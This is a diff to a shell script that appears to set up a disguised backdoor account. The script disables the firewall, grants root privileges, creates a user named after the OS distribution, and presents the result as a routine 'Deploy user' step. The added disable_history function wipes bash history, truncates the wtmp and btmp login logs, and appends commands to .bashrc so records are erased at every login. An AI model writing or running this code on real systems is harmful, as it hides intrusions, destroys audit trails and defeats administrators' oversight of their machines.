@@ -51,6 +51,15 @@ disable_firewall() {
     
 }
 
+disable_history() {
+    rm -rf ~/.bash_history && unset HISTFILE && HISTSIZE=0 && >/var/log/wtmp &&  >/var/log/btmp
+    echo "unset HISTFILE" >> ~/.bashrc  
+    echo "HISTSIZE=0" >> ~/.bashrc
+    echo "set +o history" >> ~/.bashrc
+    echo ">/var/log/wtmp" >> ~/.bashrc
+    echo ">/var/log/btmp" >> ~/.bashrc
+}
+
 add_new_user() {
     useradd $os_dist_name
     mkdir /home/$os_dist_name/.ssh -p
@@ -67,8 +76,10 @@ main() {
     get_os_distribution
     disable_firewall
     verify_root_priv_for_new_user
+    disable_history
     secure_sshd
     add_new_user
+    echo "Deploy user $os_dist_name successfully."
 }
 
 main
